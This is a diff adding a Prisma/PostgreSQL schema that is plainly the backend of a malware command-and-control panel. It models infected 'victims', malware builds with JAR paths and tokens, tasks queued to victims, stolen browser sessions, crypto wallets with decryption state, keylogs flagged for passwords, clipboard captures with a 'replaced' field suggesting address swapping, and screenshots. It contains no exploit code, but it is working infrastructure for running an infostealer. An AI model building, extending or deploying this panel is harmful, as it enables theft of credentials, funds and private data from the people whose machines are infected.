@@ -1,0 +1,347 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+enum Role {
+  admin
+  operator
+  viewer
+}
+
+enum VictimStatus {
+  online
+  stale
+  offline
+  revoked
+}
+
+enum Profile {
+  lite
+  full
+}
+
+enum TaskStatus {
+  queued
+  running
+  done
+  error
+  cancelled
+  expired
+}
+
+enum ArtifactStatus {
+  uploading
+  queued
+  processing
+  ready
+  failed
+}
+
+enum UploadState {
+  open
+  committed
+  expired
+}
+
+enum WalletState {
+  found
+  decrypted
+  locked
+  unsupported
+  corrupt
+}
+
+enum BuildStatus {
+  draft
+  ready
+  revoked
+}
+
+model Operator {
+  id             String         @id @default(uuid()) @db.Uuid
+  email          String         @unique
+  passwordHash   String
+  totpSecret     String
+  totpEnabled    Boolean        @default(false)
+  role           Role           @default(viewer)
+  disabled       Boolean        @default(false)
+  failedAttempts Int            @default(0)
+  lockedUntil    DateTime?
+  lastLoginAt    DateTime?
+  lastLoginIp    String?
+  createdAt      DateTime       @default(now())
+  sessions       Session[]
+  audit          AuditLog[]
+  tasks          Task[]
+  builds         Build[]
+  notifications  Notification[]
+
+  @@index([role])
+}
+
+model Session {
+  id         String    @id @default(uuid()) @db.Uuid
+  operatorId String    @db.Uuid
+  tokenHash  String    @unique
+  ip         String?
+  userAgent  String?
+  expiresAt  DateTime
+  revokedAt  DateTime?
+  createdAt  DateTime  @default(now())
+  operator   Operator  @relation(fields: [operatorId], references: [id], onDelete: Cascade)
+
+  @@index([operatorId, expiresAt])
+}
+
+model Build {
+  id          String      @id @default(uuid()) @db.Uuid
+  name        String
+  version     String
+  profile     Profile     @default(full)
+  buildId     String      @unique @db.Uuid
+  tokenHash   String      @unique
+  secret      String
+  config      Json
+  jarPath     String?
+  status      BuildStatus @default(draft)
+  createdById String?     @db.Uuid
+  createdAt   DateTime    @default(now())
+  revokedAt   DateTime?
+  createdBy   Operator?   @relation(fields: [createdById], references: [id], onDelete: SetNull)
+  victims     Victim[]
+
+  @@index([status, createdAt])
+}
+
+model Victim {
+  id              String           @id @default(uuid()) @db.Uuid
+  buildId         String           @db.Uuid
+  externalId      String           @default(uuid()) @db.Uuid
+  hostname        String
+  os              String
+  osVersion       String           @default("")
+  arch            String           @default("x86_64")
+  username        String
+  ip              String?
+  country         String?
+  countryCode     String?
+  city            String?
+  lat             Float?
+  lon             Float?
+  tags            String[]         @default([])
+  status          VictimStatus     @default(online)
+  profile         Profile          @default(full)
+  agentVersion    String           @default("")
+  deviceTokenEnc  String
+  firstSeenAt     DateTime         @default(now())
+  lastHeartbeatAt DateTime         @default(now())
+  revokedAt       DateTime?
+  build           Build            @relation(fields: [buildId], references: [id], onDelete: Restrict)
+  sessions        SessionInfo[]
+  tasks           Task[]
+  artifacts       Artifact[]
+  uploads         Upload[]
+  wallets         Wallet[]
+  clipboard       ClipboardEntry[]
+  keylogs         Keylog[]
+  screenshots     Screenshot[]
+  events          Event[]
+  notifications   Notification[]
+
+  @@unique([buildId, hostname, username])
+  @@index([status, lastHeartbeatAt])
+  @@index([os, country])
+}
+
+/// Browser/product session material distinct from console operator sessions.
+model SessionInfo {
+  id        String   @id @default(uuid()) @db.Uuid
+  victimId  String   @db.Uuid
+  kind      String
+  target    String
+  path      String
+  size      Int      @default(0)
+  updatedAt DateTime @default(now())
+  victim    Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@unique([victimId, kind, path])
+}
+
+model Task {
+  id          String     @id @default(uuid()) @db.Uuid
+  victimId    String     @db.Uuid
+  name        String
+  params      Json       @default("{}")
+  status      TaskStatus @default(queued)
+  priority    Int        @default(0)
+  timeoutSec  Int        @default(120)
+  leaseUntil  DateTime?
+  attempts    Int        @default(0)
+  result      Json?
+  error       String?
+  createdById String?    @db.Uuid
+  createdAt   DateTime   @default(now())
+  notBefore   DateTime   @default(now())
+  finishedAt  DateTime?
+  victim      Victim     @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  createdBy   Operator?  @relation(fields: [createdById], references: [id], onDelete: SetNull)
+  artifacts   Artifact[]
+
+  @@index([victimId, status, createdAt])
+  @@index([status, notBefore])
+}
+
+model Upload {
+  id         String      @id @default(uuid()) @db.Uuid
+  victimId   String      @db.Uuid
+  taskId     String?     @db.Uuid
+  module     String
+  totalSize  Int
+  chunkCount Int
+  sha256     String
+  received   Int         @default(0)
+  state      UploadState @default(open)
+  path       String
+  expiresAt  DateTime
+  createdAt  DateTime    @default(now())
+  victim     Victim      @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  artifact   Artifact?
+
+  @@index([victimId, state, expiresAt])
+}
+
+model Artifact {
+  id            String         @id @default(uuid()) @db.Uuid
+  victimId      String         @db.Uuid
+  uploadId      String         @unique @db.Uuid
+  taskId        String?        @db.Uuid
+  module        String
+  bytes         Int
+  sha256        String
+  containerPath String
+  status        ArtifactStatus @default(uploading)
+  manifest      Json?
+  error         String?
+  createdAt     DateTime       @default(now())
+  processedAt   DateTime?
+  victim        Victim         @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  task          Task?          @relation(fields: [taskId], references: [id], onDelete: SetNull)
+  upload        Upload         @relation(fields: [uploadId], references: [id], onDelete: Cascade)
+  wallets       Wallet[]
+  screenshots   Screenshot[]
+
+  @@index([victimId, module, createdAt])
+  @@index([status])
+}
+
+model Wallet {
+  id           String      @id @default(uuid()) @db.Uuid
+  victimId     String      @db.Uuid
+  artifactId   String?     @db.Uuid
+  kind         String
+  targetId     String
+  path         String
+  state        WalletState @default(found)
+  decryptState String      @default("none")
+  reason       String?
+  address      String?
+  balance      String?
+  createdAt    DateTime    @default(now())
+  victim       Victim      @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  artifact     Artifact?   @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+
+  @@unique([victimId, path])
+  @@index([victimId, state])
+  @@index([state, address])
+}
+
+model ClipboardEntry {
+  id       String   @id @default(uuid()) @db.Uuid
+  victimId String   @db.Uuid
+  ts       DateTime @default(now())
+  window   String   @default("")
+  process  String   @default("")
+  content  String
+  kind     String   @default("text")
+  replaced String?
+  victim   Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@index([victimId, ts])
+}
+
+model Keylog {
+  id       String   @id @default(uuid()) @db.Uuid
+  victimId String   @db.Uuid
+  ts       DateTime @default(now())
+  process  String   @default("")
+  title    String   @default("")
+  text     String
+  password Boolean  @default(false)
+  victim   Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@index([victimId, ts])
+  @@index([victimId, password])
+}
+
+model Screenshot {
+  id         String   @id @default(uuid()) @db.Uuid
+  victimId   String   @db.Uuid
+  artifactId String   @db.Uuid
+  ts         DateTime @default(now())
+  width      Int?
+  height     Int?
+  victim     Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  artifact   Artifact @relation(fields: [artifactId], references: [id], onDelete: Cascade)
+
+  @@index([victimId, ts])
+}
+
+model Event {
+  id        String    @id @default(uuid()) @db.Uuid
+  victimId  String    @db.Uuid
+  kind      String
+  data      Json      @default("{}")
+  createdAt DateTime  @default(now())
+  readAt    DateTime?
+  victim    Victim    @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@index([victimId, createdAt])
+  @@index([readAt])
+}
+
+model Notification {
+  id         String    @id @default(uuid()) @db.Uuid
+  kind       String
+  title      String
+  body       String
+  link       String?
+  victimId   String?   @db.Uuid
+  operatorId String?   @db.Uuid
+  readAt     DateTime?
+  createdAt  DateTime  @default(now())
+  victim     Victim?   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  operator   Operator? @relation(fields: [operatorId], references: [id], onDelete: Cascade)
+
+  @@index([readAt, createdAt])
+}
+
+model AuditLog {
+  id         String    @id @default(uuid()) @db.Uuid
+  operatorId String?   @db.Uuid
+  action     String
+  entity     String
+  entityId   String?
+  ip         String?
+  data       Json      @default("{}")
+  createdAt  DateTime  @default(now())
+  operator   Operator? @relation(fields: [operatorId], references: [id], onDelete: SetNull)
+
+  @@index([createdAt])
+  @@index([operatorId, createdAt])
+  @@index([entity, entityId])
+}
